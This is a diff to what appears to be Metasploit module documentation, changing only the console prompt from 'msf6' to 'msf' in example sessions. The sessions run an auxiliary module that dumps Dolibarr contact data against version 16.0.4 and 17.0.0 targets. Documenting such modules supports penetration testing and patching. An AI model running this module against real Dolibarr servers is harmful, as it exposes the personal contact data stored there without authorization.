@@ -86,10 +86,10 @@ The path to Dolibarr instance.  Defaults to `/`,  `http://dolibarrdomain/`
 ### Dolibarr 16.0.4 on Ubuntu 22.10
 Exploitation of a Dolibarr 16.0.4.
 ```
-msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS http://[Dolibarr domain]/
+msf > use auxiliary/scanner/http/dolibarr_16_contact_dump
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS http://[Dolibarr domain]/
 RHOSTS => http://[Dolibarr domain]/
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4                                        
@@ -107,10 +107,10 @@ msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 ### Dolibarr 16.0.4 on Ubuntu 22.10
 Attempted exploitation of a Dolibarr 16.0.4 with an empty database.
 ```
-msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
+msf > use auxiliary/scanner/http/dolibarr_16_contact_dump 
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
 RHOSTS => X.X.X.X
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4
@@ -121,12 +121,12 @@ msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 ### Dolibarr 17.0.0 on Ubuntu 22.10
 Attempted exploitation of a Dolibarr 17.0.0.
 ```
-msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
+msf > use auxiliary/scanner/http/dolibarr_16_contact_dump 
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
 RHOSTS => X.X.X.X
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set verbose true
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
+msf auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The target is not exploitable. Detected apparently non-vulnerable Dolibarr version: 17.0.0 ForceExploit is enabled, proceeding with exploitation.
